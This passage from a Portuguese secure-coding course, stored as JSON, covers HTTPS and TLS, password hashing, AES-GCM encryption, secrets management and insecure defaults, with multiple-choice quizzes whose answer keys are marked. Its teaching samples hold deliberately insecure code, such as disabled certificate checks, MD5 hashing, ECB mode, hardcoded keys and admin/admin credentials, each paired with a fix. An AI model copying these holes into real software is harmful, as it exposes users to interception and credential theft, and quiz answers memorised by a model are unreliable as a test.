                        "value": "## O que o TLS garante (e o que não garante)\n\nUma conexão TLS bem configurada entrega três coisas:\n\n- **Confidencialidade**: o conteúdo viaja cifrado, ilegível para quem estiver no meio.\n- **Integridade**: adulterações no caminho são detectadas.\n- **Autenticação do servidor**: o **certificado** prova que você está falando com o servidor certo, e não com um impostor.\n\nMas atenção ao que o TLS **não** faz: ele protege os dados **no caminho**, não depois. Assim que a resposta chega ao servidor e é decifrada, valem as proteções de **dados em repouso**. E o TLS não conserta um site que aceita senha fraca ou tem injeção. Para forçar o uso de HTTPS, três medidas andam juntas: **redirecionar** todo HTTP para HTTPS, enviar o cabeçalho **HSTS** (o navegador passa a exigir HTTPS sozinho) e marcar o cookie de sessão como **Secure**."
                    },
                    {
                        "type": "code",
                        "value": "// Forcar HTTPS no servidor (exemplo com Express)\n\n// 1) redirecionar todo acesso HTTP para HTTPS\napp.use((req, res, next) => {\n  if (!req.secure) return res.redirect(301, \"https://\" + req.headers.host + req.url);\n  next();\n});\n\n// 2) HSTS: o navegador passa a exigir HTTPS por conta propria (evita downgrade)\nres.setHeader(\"Strict-Transport-Security\", \"max-age=31536000; includeSubDomains\");\n\n// 3) cookie de sessao seguro\nres.cookie(\"session\", token, {\n  secure: true,    // so trafega se a conexao for HTTPS\n  httpOnly: true,  // JavaScript nao le o cookie (ajuda contra XSS)\n  sameSite: \"lax\", // limita envio em requisicoes de outros sites (ajuda contra CSRF)\n});"
                    },
                    {
                        "type": "code",
                        "value": "// VULNERAVEL: desliga a verificacao do certificado TLS.\n// A URL continua \"https\", mas a conexao aceita QUALQUER certificado\n// -> abre a porta para man-in-the-middle.\nconst r = await fetch(\"https://api.parceiro.com/dados\", {\n  agent: new https.Agent({ rejectUnauthorized: false }),\n});\n// (igualmente perigoso, e pior por ser global:)\n// process.env.NODE_TLS_REJECT_UNAUTHORIZED = \"0\";\n\n// SEGURO: mantenha a verificacao ligada (o padrao).\n// Se o certificado e invalido, conserte o certificado, nao desligue a checagem.\nconst resposta = await fetch(\"https://api.parceiro.com/dados\");"
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** sem HTTPS, credenciais, cookies de sessão e PII trafegam em texto plano e podem ser lidos e adulterados. O **TLS** dá confidencialidade, integridade e autenticação do servidor. Force HTTPS com **redirect + HSTS + cookie Secure**, e **nunca** desligue a validação de certificado (`rejectUnauthorized: false`)."
                    }
                ],
                "questions": [
                    {
                        "statement": "Num Wi-Fi público, um app faz login por HTTP puro (sem HTTPS). O que um atacante na mesma rede consegue?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Ler usuário, senha e cookie de sessão, pois tudo viaja em texto plano.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nada: o navegador cifra a senha sozinho antes mesmo de enviá-la.",
                                "isCorrect": false
                            },
                            {
                                "text": "Só o endereço do site, já que o conteúdo enviado vai sempre oculto.",
                                "isCorrect": false
                            },
                            {
                                "text": "Só consegue atacar se souber a chave privada do certificado TLS.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O que uma conexão HTTPS/TLS bem configurada oferece?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Confidencialidade e integridade no caminho, e autenticação do servidor.",
                                "isCorrect": true
                            },
                            {
                                "text": "Proteção automática para os dados já guardados no banco do servidor.",
                                "isCorrect": false
                            },
                            {
                                "text": "Garantia de que o site não tem mais nenhuma outra vulnerabilidade.",
                                "isCorrect": false
                            },
                            {
                                "text": "Geração automática de senhas fortes para todos os usuários novos.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Para que serve o cabeçalho Strict-Transport-Security (HSTS)?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Faz o navegador exigir HTTPS sozinho, evitando o downgrade para HTTP.",
                                "isCorrect": true
                            },
                            {
                                "text": "Cifra os dados sensíveis que já estão guardados no banco de dados.",
                                "isCorrect": false
                            },
                            {
                                "text": "Substitui de vez a necessidade de ter um certificado TLS válido.",
                                "isCorrect": false
                            },
                            {
                                "text": "Bloqueia tentativas de injeção de SQL contra o servidor de banco.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O servidor define o cookie de sessão assim:\n\nres.cookie(\"session\", token);\n\nDo ponto de vista de dados em trânsito, qual flag falta e por quê?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Falta \"secure: true\", para o cookie nunca trafegar por HTTP puro.",
                                "isCorrect": true
                            },
                            {
                                "text": "Falta \"maxAge\", senão o cookie expira assim que é criado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Falta \"domain\", senão o navegador nunca chega a salvar o cookie.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nada falta: todo cookie já é cifrado por padrão pelo navegador.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Ao chamar uma API externa, um dev usa:\n\nnew https.Agent({ rejectUnauthorized: false })\n\nQual é o risco?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Aceita qualquer certificado na conexão: abre brecha para man-in-the-middle.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum: o prefixo https já garante toda a segurança, mesmo com essa opção.",
                                "isCorrect": false
                            },
                            {
                                "text": "Só torna a chamada perceptivelmente mais lenta do que o normal, nada mais.",
                                "isCorrect": false
                            },
                            {
                                "text": "Faz o Node ignorar completamente o HTTPS e mandar tudo por HTTP puro.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Hashing de senhas do jeito certo",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Hashing de senhas do jeito certo\n\nUm vazamento de banco de dados é questão de **quando**, não de **se**. Por isso a regra número um sobre senhas é: **você nunca deve conseguir descobrir a senha de um usuário**, nem você, nem quem roubar o seu banco. Isso elimina duas ideias ruins de cara: guardar a senha em **texto plano** e guardar **cifrada** (reversível).\n\nA forma correta é o **hashing**: uma função de **mão única** que transforma a senha numa impressão digital da qual **não dá para voltar**. No login, você hasheia a senha informada e **compara os hashes**, sem nunca precisar guardar a senha original."
                    },
                    {
                        "type": "code",
                        "value": "// TRES formas ERRADAS de guardar senha\n\n// 1) texto plano: um dump do banco entrega todas as senhas\nawait db.users.insert({ email, senha });\n\n// 2) hash rapido e SEM salt (MD5/SHA-1): quebravel com rainbow tables\nconst h1 = crypto.createHash(\"md5\").update(senha).digest(\"hex\");\n\n// 3) SHA-256 puro: continua rapido demais; uma GPU testa bilhoes por segundo\nconst h2 = crypto.createHash(\"sha256\").update(senha).digest(\"hex\");"
                    },
                    {
                        "type": "text",
                        "value": "## Por que MD5, SHA-1 e SHA-256 \"puros\" não servem\n\nEssas funções foram feitas para serem **rápidas**, ótimo para verificar a integridade de um arquivo, péssimo para senhas. Um atacante com GPU testa **bilhões** de tentativas por segundo, e ainda usa **rainbow tables** (tabelas gigantes de senha para hash já calculadas). Pior: sem **salt**, senhas iguais viram hashes iguais, então dá para ver quem usa a mesma senha e reaproveitar o trabalho.\n\nA correção tem duas partes:\n\n- **Salt**: um valor **aleatório e único por usuário**, somado à senha antes do hash. Ele inutiliza rainbow tables e faz senhas iguais gerarem hashes diferentes.\n- **Função lenta e adaptativa**: em vez de MD5/SHA, use algoritmos feitos para senha, **bcrypt**, **scrypt** ou **argon2**. Eles são **propositalmente lentos** e têm um **fator de custo** ajustável, que você aumenta conforme o hardware evolui. Esses algoritmos **já geram e embutem o salt** para você.\n\nHoje o **argon2id** é o mais recomendado; o **bcrypt** é mais antigo, mas continua uma escolha sólida e muito testada."
                    },
                    {
                        "type": "code",
                        "value": "// CERTO com bcrypt: o salt e gerado e embutido no proprio hash\nimport bcrypt from \"bcrypt\";\n\n// no cadastro (12 = fator de custo; aumente conforme o hardware melhora)\nconst hash = await bcrypt.hash(senha, 12);\nawait db.users.insert({ email, senha: hash });\n\n// no login: compara em tempo constante (resistente a timing attack)\nconst ok = await bcrypt.compare(senhaInformada, usuario.senha);\n\n// CERTO com argon2id (recomendado atualmente)\nimport argon2 from \"argon2\";\nconst hash2 = await argon2.hash(senha, { type: argon2.argon2id });\nconst ok2 = await argon2.verify(hash2, senhaInformada);"
                    },
                    {
                        "type": "table",
                        "value": "[[\"Abordagem\",\"Reversível na prática?\",\"Resiste a GPU / rainbow table?\",\"Veredito\"],[\"Texto plano\",\"Trivial\",\"Não\",\"Nunca use\"],[\"MD5 / SHA-1 sem salt\",\"Sim\",\"Não\",\"Nunca use\"],[\"SHA-256 com salt\",\"Não\",\"Não (rápido demais)\",\"Insuficiente para senha\"],[\"bcrypt / scrypt / argon2\",\"Não\",\"Sim (lento e com salt)\",\"Correto\"]]"
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** senha nunca em texto plano nem cifrada de forma reversível. Use **hashing de mão única** com **salt único por usuário** e uma função **lenta e adaptativa** (**bcrypt**, **scrypt** ou **argon2id**). No login, **compare os hashes** com a função da própria biblioteca, nunca com um `==` improvisado."
                    }
                ],
                "questions": [
                    {
                        "statement": "Qual é a forma correta de guardar senhas de usuários?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Fazer hashing de mão única da senha, com bcrypt, scrypt ou argon2.",
                                "isCorrect": true
                            },
                            {
                                "text": "Guardar em texto plano, desde que o acesso ao banco seja restrito.",
                                "isCorrect": false
                            },
                            {
                                "text": "Cifrar com AES, assim dá para recuperar a senha depois se precisar.",
                                "isCorrect": false
                            },
                            {
                                "text": "Codificar em Base64 antes de salvar, o que já basta para senha.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "O que é o \"salt\" no hashing de senhas?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Um valor aleatório e único por usuário, somado à senha antes do hash.",
                                "isCorrect": true
                            },
                            {
                                "text": "Uma chave secreta única, compartilhada entre todos os usuários.",
                                "isCorrect": false
                            },
                            {
                                "text": "O algoritmo de cifragem usado depois para reverter o hash gerado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Um segundo hash aplicado sobre o primeiro para acelerar o login.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Por que MD5 e SHA-1 são inadequados para senhas?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "São rápidos demais: uma GPU testa bilhões de tentativas por segundo.",
                                "isCorrect": true
                            },
                            {
                                "text": "Geram hashes curtos demais para caber direito nas colunas do banco.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não conseguem processar senhas que tenham caracteres especiais.",
                                "isCorrect": false
                            },
                            {
                                "text": "São reversíveis, bastando apenas ter a chave correta em mãos.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um sistema guarda senhas assim:\n\nconst hash = crypto.createHash(\"sha1\").update(senha).digest(\"hex\");\n\nQuais são os dois problemas?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "SHA-1 é rápido demais e sem salt: senha igual gera o mesmo hash.",
                                "isCorrect": true
                            },
                            {
                                "text": "SHA-1 é reversível, e o hash que ele produz é curto demais para uso.",
                                "isCorrect": false
                            },
                            {
                                "text": "Falta cifrar esse hash com AES logo depois de ele ser gerado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nenhum: o SHA-1 é o algoritmo hoje mais recomendado para senhas.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Tentando corrigir, o dev passa a fazer:\n\nconst hash = crypto.createHash(\"sha256\").update(salt + senha).digest(\"hex\");\n\nAgora há salt e SHA-256. Isso resolve?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Não: o SHA-256 ainda é rápido demais, falta usar bcrypt ou argon2.",
                                "isCorrect": true
                            },
                            {
                                "text": "Sim: com salt e SHA-256 a senha já fica de fato totalmente protegida.",
                                "isCorrect": false
                            },
                            {
                                "text": "Não, porque nesse caso o salt deveria vir depois da senha, não antes.",
                                "isCorrect": false
                            },
                            {
                                "text": "Sim, desde que esse salt tenha pelo menos uns oito caracteres.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Dados em repouso e uso correto da criptografia",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Dados em repouso e uso correto da criptografia\n\nDados **em repouso** são os que ficam **guardados**: no banco, em arquivos, em backups e até em logs. Nem tudo precisa ser cifrado, mas alguns dados sim. A pergunta-chave é: **você precisa ler esse dado de volta?**\n\n- Se **não** precisa recuperar o valor original (caso das **senhas**), use **hashing** (Aula 3).\n- Se **precisa** recuperar (ex.: um **token de acesso** de uma API de terceiro, um documento, certos dados pessoais), use **cifragem** com chave.\n\nHá dois níveis de cifragem em repouso: a do **disco/banco** (transparente, protege contra o roubo físico do servidor) e a de **campo** na aplicação (você cifra o valor antes de salvar). Elas se somam, é **defesa em profundidade**."
                    },
                    {
                        "type": "text",
                        "value": "## Criptografia simétrica do jeito certo\n\nPara cifrar dados que você mesmo vai ler depois, o padrão é a **criptografia simétrica** (a mesma chave cifra e decifra), e o algoritmo de referência é o **AES**. Mas AES sozinho não basta; os detalhes decidem se é seguro:\n\n- Use um **modo autenticado (AEAD)**: **AES-256-GCM** (ou ChaCha20-Poly1305). Além de cifrar, ele gera uma **tag de autenticação** que **detecta adulteração**.\n- Use uma **chave forte** (256 bits) e um **IV/nonce aleatório e único** a cada operação. Guarde o **IV** e a **tag** junto do texto cifrado.\n- **Evite** o modo **ECB** (revela padrões do conteúdo), **IV fixo ou reutilizado** e algoritmos fracos (**DES, 3DES, RC4**).\n- **Não invente sua própria criptografia**. Use bibliotecas testadas (o módulo crypto, libsodium/tweetnacl, Web Crypto). Cripto caseira quase sempre tem furos sutis."
                    },
                    {
                        "type": "code",
                        "value": "// VULNERAVEL: AES no modo ECB, sem IV, com chave fixa no codigo\n// ECB cifra blocos iguais no mesmo resultado -> vaza padroes do conteudo\nconst CHAVE = \"1234567890123456\"; // chave fraca e hardcoded\nconst cipher = crypto.createCipheriv(\"aes-128-ecb\", CHAVE, null);\nlet enc = cipher.update(texto, \"utf8\", \"base64\");\nenc += cipher.final(\"base64\");\n// sem tag de autenticacao: nao ha como saber se o dado foi adulterado"
                    },
                    {
                        "type": "code",
                        "value": "// SEGURO: AES-256-GCM com IV aleatorio por operacao e tag de autenticacao\nconst chave = crypto.randomBytes(32); // 256 bits, guardada fora do codigo (ver Aula 5)\n\nfunction cifrar(texto) {\n  const iv = crypto.randomBytes(12); // nonce UNICO a cada chamada, nunca reutilizar\n  const cipher = crypto.createCipheriv(\"aes-256-gcm\", chave, iv);\n  const enc = Buffer.concat([cipher.update(texto, \"utf8\"), cipher.final()]);\n  const tag = cipher.getAuthTag();\n  return { iv, tag, enc }; // guarde os tres juntos\n}\n\nfunction decifrar({ iv, tag, enc }) {\n  const d = crypto.createDecipheriv(\"aes-256-gcm\", chave, iv);\n  d.setAuthTag(tag); // se o dado foi adulterado, o final() abaixo lanca erro\n  return Buffer.concat([d.update(enc), d.final()]).toString(\"utf8\");\n}"
                    },
                    {
                        "type": "table",
                        "value": "[[\"Objetivo\",\"Use\",\"Evite\"],[\"Cifrar dado recuperável\",\"AES-256-GCM, ChaCha20-Poly1305\",\"AES-ECB, DES, 3DES, RC4\"],[\"IV / nonce\",\"Aleatório e único por operação\",\"Fixo ou reutilizado\"],[\"Chave\",\"256 bits, guardada fora do código\",\"Curta ou hardcoded no código\"],[\"Integridade\",\"Modo autenticado (GCM) ou HMAC-SHA-256\",\"MD5, SHA-1\"]]"
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** cifre em repouso o que precisa ser **lido de volta** (senha, não: use hash). Prefira **AES-256-GCM** com **IV aleatório e único** e guarde IV + tag junto do texto cifrado. Fuja de **ECB**, **IV reutilizado** e algoritmos fracos, e **nunca crie a sua própria criptografia**."
                    }
                ],
                "questions": [
                    {
                        "statement": "Quando faz sentido cifrar (em vez de hashear) um dado em repouso?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Quando é preciso ler o valor original depois, como token de terceiros.",
                                "isCorrect": true
                            },
                            {
                                "text": "Sempre que o dado guardado for a senha de algum usuário cadastrado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nunca: todo dado guardado em repouso deveria ser apenas hasheado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Só quando esse dado em questão já for público de qualquer forma.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Qual é uma escolha recomendada para cifrar dados em repouso hoje?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "AES-256-GCM: modo autenticado, com IV aleatório a cada operação.",
                                "isCorrect": true
                            },
                            {
                                "text": "AES no modo ECB, o mais indicado para arquivos grandes.",
                                "isCorrect": false
                            },
                            {
                                "text": "DES com chave de 56 bits, robusto para os padrões atuais.",
                                "isCorrect": false
                            },
                            {
                                "text": "MD5 com salt, já é suficiente para proteger dados em repouso.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Por que o modo ECB é desaconselhado?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Blocos de texto iguais geram blocos cifrados iguais, vazando padrões.",
                                "isCorrect": true
                            },
                            {
                                "text": "Porque o modo ECB é considerado lento demais para uso em produção.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque esse modo exige um IV diferente a cada byte que for cifrado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Porque esse modo só funciona corretamente com chaves de 512 bits.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um trecho cifra dados assim:\n\ncrypto.createCipheriv(\"aes-128-ecb\", CHAVE_FIXA, null)\n\nQuais dois problemas estão presentes?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Modo ECB, que vaza padrões, e chave fixa direto no código-fonte.",
                                "isCorrect": true
                            },
                            {
                                "text": "Chave longa demais e um IV aleatório sendo usado em excesso.",
                                "isCorrect": false
                            },
                            {
                                "text": "Uso do modo GCM sem nunca definir a tag de autenticação.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nenhum: ECB com chave fixa já é a configuração segura padrão.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Para cifrar vários registros com AES-256-GCM, um dev cria o IV uma única vez, fora do laço, e o reaproveita em todas as chamadas. Qual é o risco?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Reutilizar o IV no GCM quebra a confidencialidade e permite forjar mensagens.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nenhum problema real: no modo GCM o IV sempre pode ser fixo à vontade.",
                                "isCorrect": false
                            },
                            {
                                "text": "Isso só deixa cada operação de cifragem levemente mais lenta que o normal.",
                                "isCorrect": false
                            },
                            {
                                "text": "O problema real está no tamanho do IV: deveria ter 32 bytes, e não 12.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            },
            {
                "titulo": "Gestão de segredos e erros comuns",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Gestão de segredos e erros comuns\n\nToda a criptografia deste módulo depende de **segredos**: chaves de cifragem, senhas de banco, chaves de API, chaves privadas, segredos de assinatura de token. E a criptografia mais forte do mundo não vale nada se o **segredo vazar**. O erro mais comum, e mais grave, é **hardcodar** segredos no código-fonte e **commitá-los** no repositório.\n\nPor que é tão perigoso? Porque o **histórico do Git guarda para sempre**: apagar a chave num commit novo não a remove do histórico. E repositórios (principalmente os públicos) são **varridos por bots** em segundos atrás de chaves expostas. Um segredo commitado deve ser considerado **comprometido** e **rotacionado** imediatamente."
                    },
                    {
                        "type": "code",
                        "value": "// VULNERAVEL: segredos hardcoded no codigo (e versionados no Git)\nconst STRIPE_KEY = \"sk_live_51H0abc...chave_real...\";\nconst db = connect(\"postgres://admin:SenhaForte123@db.interno:5432/app\");\n\n// SEGURO: segredos vem do ambiente; nada sensivel no codigo\nconst STRIPE_KEY = process.env.STRIPE_KEY;\nconst db = connect(process.env.DATABASE_URL);\n// o arquivo .env NAO vai para o Git (entra no .gitignore)"
                    },
                    {
                        "type": "text",
                        "value": "## Onde os segredos devem viver\n\nAlgumas práticas que andam juntas:\n\n- **Variáveis de ambiente**: a aplicação lê os segredos do ambiente (padrão dos \"12 fatores\"), não de constantes no código.\n- **Arquivo .env fora do versionamento**: útil em desenvolvimento, mas sempre no **.gitignore**. Versione um **.env.example** só com os nomes das variáveis, sem valores.\n- **Cofres de segredos (vaults)**: em produção, prefira um gerenciador dedicado (Vault, AWS Secrets Manager, KMS). Eles controlam o acesso, auditam o uso e facilitam a **rotação**.\n- **Menor privilégio e rotação**: cada serviço recebe só os segredos de que precisa, com valores **diferentes por ambiente** (dev, homologação, produção) e chaves **rotacionadas** periodicamente.\n- **Aleatoriedade criptográfica**: gere tokens e identificadores secretos com **crypto.randomBytes** ou **crypto.randomUUID**, nunca com **Math.random()**, que é previsível.\n- **Não logue segredos nem PII**: cuidado ao logar objetos inteiros de requisição, cabeçalhos ou corpos, um vazamento silencioso muito comum."
                    },
                    {
                        "type": "code",
                        "value": "// VULNERAVEL: token previsivel (Math.random NAO e criptografico)\nconst tokenReset = Math.random().toString(36).slice(2);\n\n// SEGURO: 32 bytes de aleatoriedade criptografica\nimport crypto from \"crypto\";\nconst tokenReset = crypto.randomBytes(32).toString(\"hex\");\n\n// para identificadores, tambem serve:\nconst id = crypto.randomUUID();"
                    },
                    {
                        "type": "table",
                        "value": "[[\"Frente\",\"Errado\",\"Certo\"],[\"Em trânsito\",\"HTTP puro, certificado sem validação\",\"HTTPS + HSTS, cookie Secure\"],[\"Senhas\",\"Texto plano, MD5/SHA puros\",\"bcrypt / scrypt / argon2 com salt\"],[\"Em repouso\",\"AES-ECB, IV fixo, cripto caseira\",\"AES-256-GCM, IV único por operação\"],[\"Segredos\",\"Hardcoded no código / no Git\",\"Variáveis de ambiente ou cofre, com rotação\"],[\"Aleatoriedade\",\"Math.random()\",\"crypto.randomBytes / randomUUID\"]]"
                    },
                    {
                        "type": "quote",
                        "value": "**Recapitulando:** a criptografia só é tão segura quanto os **segredos** que a sustentam. Nunca hardcode chaves nem as comite no Git; use **variáveis de ambiente** e **cofres**, com **menor privilégio** e **rotação**. Gere valores secretos com aleatoriedade **criptográfica** e **não logue** segredos nem dados pessoais."
                    }
                ],
                "questions": [
                    {
                        "statement": "Por que hardcodar uma chave de API no código e commitá-la é perigoso?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "O histórico do Git é permanente, e bots varrem repositórios atrás delas.",
                                "isCorrect": true
                            },
                            {
                                "text": "Não é perigoso, desde que o repositório continue marcado como privado.",
                                "isCorrect": false
                            },
                            {
                                "text": "Só vira problema real se a chave tiver menos de dezesseis caracteres.",
                                "isCorrect": false
                            },
                            {
                                "text": "Nenhum: o próprio Git já cifra o código, então a chave fica protegida.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Onde os segredos de produção devem ficar?",
                        "difficulty": "facil",
                        "options": [
                            {
                                "text": "Em variáveis de ambiente ou num cofre de segredos, fora do código.",
                                "isCorrect": true
                            },
                            {
                                "text": "Em constantes soltas no topo do arquivo principal da aplicação.",
                                "isCorrect": false
                            },
                            {
                                "text": "Comentados dentro do código-fonte, para nunca serem executados.",
                                "isCorrect": false
                            },
                            {
                                "text": "Num arquivo .env versionado junto com o resto no repositório Git.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Por que Math.random() não deve ser usado para gerar tokens de redefinição de senha?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Não é seguro: a sequência gerada é previsível e pode ser adivinhada.",
                                "isCorrect": true
                            },
                            {
                                "text": "É lento demais para gerar tokens em sistemas de alto tráfego.",
                                "isCorrect": false
                            },
                            {
                                "text": "Só produz números, e um bom token precisa conter letras também.",
                                "isCorrect": false
                            },
                            {
                                "text": "Produz valores grandes demais para caber numa coluna do banco.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Você encontra no código:\n\nconst tokenReset = Math.random().toString(36).slice(2);\n\nQual correção resolve o problema?",
                        "difficulty": "medio",
                        "options": [
                            {
                                "text": "Usar crypto.randomBytes(32).toString(\"hex\"), que é criptográfico.",
                                "isCorrect": true
                            },
                            {
                                "text": "Concatenar dois Math.random() seguidos para dobrar o tamanho.",
                                "isCorrect": false
                            },
                            {
                                "text": "Aplicar Base64 sobre o resultado que o Math.random() gerar.",
                                "isCorrect": false
                            },
                            {
                                "text": "Somar a data e a hora atuais ao valor gerado pelo token.",
                                "isCorrect": false
                            }
                        ]
                    },
                    {
                        "statement": "Um segredo de assinatura de token foi commitado por engano e, em seguida, removido em um novo commit. Qual é a atitude correta?",
                        "difficulty": "dificil",
                        "options": [
                            {
                                "text": "Considerar o segredo comprometido e rotacioná-lo: segue no histórico.",
                                "isCorrect": true
                            },
                            {
                                "text": "Nada mais: o próprio commit que remove o segredo já o apaga do histórico.",
                                "isCorrect": false
                            },
                            {
                                "text": "Apenas tornar esse repositório privado já resolve todo o problema.",
                                "isCorrect": false
                            },
                            {
                                "text": "Basta renomear a variável de ambiente que guardava aquele segredo.",
                                "isCorrect": false
                            }
                        ]
                    }
                ]
            }
        ]
    },
    {
        "titulo": "Módulo 5 - Configuração incorreta (A02) e cadeia de suprimentos de software (A03)",
        "aulas": [
            {
                "titulo": "Configuração incorreta (A02): o detalhe que abre a porta",
                "blocks": [
                    {
                        "type": "text",
                        "value": "# Configuração incorreta (A02): o detalhe que abre a porta\n\nAté aqui você viu vulnerabilidades que nascem do **código** que você escreve. Este módulo trata de um jeito diferente de ser invadido: pelo **entorno** do seu código. São duas categorias irmãs do OWASP Top 10 2025 que quase sempre andam juntas na vida real: a **A02 - Configuração incorreta** (as engrenagens ao redor do app mal ajustadas) e a **A03 - Falhas na cadeia de suprimentos de software** (o código de terceiros que você traz para dentro).\n\nComeçamos pela A02. Uma **configuração incorreta** é qualquer ajuste relevante para segurança que está **errado, ausente ou deixado num padrão inseguro** — no servidor web, no framework, no banco de dados, na nuvem, no container, no CI. O código pode estar impecável e, ainda assim, uma única caixa marcada errada deixa a porta escancarada.\n\nNa edição de 2025 essa categoria **subiu para o segundo lugar**. O motivo é simples: aplicações modernas têm muitas peças, cada peça tem dezenas de opções, e os valores de fábrica costumam priorizar **conveniência**, não segurança. Some a isso a diferença entre o que roda na sua máquina e o que roda em produção, e o resultado é a falha mais comum que existe."
                    },
                    {
                        "type": "table",
                        "value": "[[\"Forma de má configuração\",\"Exemplo típico\",\"Risco principal\"],[\"Defaults inseguros\",\"Conta admin/admin, segredo padrão no código\",\"Acesso direto sem precisar de outra falha\"],[\"Erros verbosos\",\"Stack trace e erro do banco enviados ao cliente\",\"Vazamento de informação para reconhecimento\"],[\"Cabeçalhos ausentes\",\"Sem HSTS, sem X-Content-Type-Options\",\"Downgrade, clickjacking, MIME sniffing\"],[\"Serviços/portas expostos\",\"Banco publicado na internet, painel admin aberto\",\"Superfície de ataque desnecessária\"],[\"Permissões excessivas\",\"App conecta ao banco como superusuário\",\"Um comprometimento vira controle total\"],[\"Diretórios listáveis\",\"Servidor lista pastas com .env e backups\",\"Exposição de segredos e código-fonte\"]]"
                    },
                    {
                        "type": "text",
                        "value": "## Defaults inseguros: a conta que veio de fábrica\n\nO exemplo mais clássico de configuração incorreta é o **valor padrão inseguro**. Painéis administrativos que já vêm com **admin/admin**, bancos de dados com senha padrão, chaves de exemplo que o framework sugere e ninguém troca, um segredo de sessão com um valor de fallback fixo no código.\n\nO ponto que assusta: esses defaults são **públicos e conhecidos**. O atacante não precisa adivinhar nada — existem listas prontas e robôs que varrem a internet testando exatamente essas combinações. Não é preciso quebrar nenhuma criptografia nem explorar nenhum bug: é só **entrar pela porta que ficou aberta**.\n\nVeja um trecho de inicialização com três defaults perigosos ao mesmo tempo: um segredo com fallback fixo, uma conta administrativa com senha padrão e o CORS liberado para qualquer origem."
                    },
                    {
                        "type": "code",
                        "value": "// config.js (INSEGURO)\n\n// Segredo de sessao com fallback fixo: se a variavel de ambiente\n// nao vier, usa um valor que esta versionado no repositorio.\nconst JWT_SECRET = process.env.JWT_SECRET || \"dev-secret\";\n\n// Semeia o primeiro admin com uma senha padrao conhecida.\nasync function criarAdminSePreciso() {\n  const total = await db.users.count();\n  if (total === 0) {\n    await db.users.insert({\n      email: \"admin@exemplo.com\",\n      senha: \"admin\",        // credencial de fabrica\n      role: \"admin\",\n    });\n  }\n}\n\n// CORS liberado \"so para funcionar\".\napp.use(cors({ origin: \"*\" }));"
                    },
                    {
                        "type": "code",
                        "value": "// config.js (SEGURO)\n\n// Sem fallback: se o segredo nao estiver definido (ou for fraco),\n// a aplicacao nem sobe. Melhor falhar do que rodar insegura.\nconst JWT_SECRET = process.env.JWT_SECRET;\nif (!JWT_SECRET || JWT_SECRET.length < 32) {\n  throw new Error(\"JWT_SECRET ausente ou fraco: defina um segredo forte no ambiente\");\n}\n\n// Nada de senha de fabrica: o admin define a propria senha via convite.\nasync function criarAdminSePreciso() {\n  const total = await db.users.count();\n  if (total === 0) {\n    await db.users.insert({\n      email: \"admin@exemplo.com\",\n      senhaHash: null,             // sem senha ate aceitar o convite\n      precisaDefinirSenha: true,\n      conviteToken: gerarTokenSeguro(),\n      role: \"admin\",\n    });\n  }\n}\n\n// CORS restrito a uma lista explicita de origens confiaveis.\nconst permitidas = (process.env.CORS_ORIGINS || \"\").split(\",\").filter(Boolean);\napp.use(cors({ origin: permitidas }));"
                    },
                    {
                        "type": "quote",
                        "value": "**Configuração incorreta (A02)** é segurança que depende não do que você programou, mas de como tudo ao redor foi ajustado. Trate configuração como código: revise, versione e **endureça por padrão**. E lembre da regra de ouro dos defaults: se o valor veio de fábrica e é conhecido, considere-o **público**."
                    }
                ],
                "questions": [
                    {
                        "statement": "Em segurança, o que melhor descreve uma 'configuração incorreta' (A02)?",
